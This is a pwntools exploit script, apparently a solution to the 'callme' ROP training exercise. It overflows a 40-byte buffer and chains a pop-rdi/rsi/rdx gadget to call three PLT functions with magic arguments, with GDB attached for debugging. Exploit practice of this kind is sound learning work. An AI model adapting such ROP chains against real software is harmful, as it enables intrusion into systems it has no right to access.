from pwn import *
import argparse, time

parser = argparse.ArgumentParser()
#parser.add_argument("--offset", type=int, required=True)
#parser.add_argument("--buffer_offset", type=int, required=True)
parser.add_argument("--debug", action='store_true', help="Enable debugging")
args = parser.parse_args()

context.arch='amd64'

def callGDB():
    gdb.attach(io,'''
        b *0x00000000004008f1

    ''')

io = process('./callme')

callGDB()


callme_one_plt = 0x0000000000400720
callme_two_plt = 0x0000000000400740
callme_three_plt = 0x00000000004006f0

io.recvline(b"> ")

#io.send(cyclic(50)) # eip offset is 40


payload = b"A" *40
payload += p64(0x000000000040093c) # pop rdi ; pop rsi ; pop rdx ; ret
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(callme_one_plt)
payload += p64(0x000000000040093c)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(callme_two_plt)
payload += p64(0x000000000040093c)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(callme_three_plt)
payload += p64(0x00000000004009a3)
payload += p64(0x1)
payload += p64(0x0000000000400750)

io.send(payload)

io.interactive()
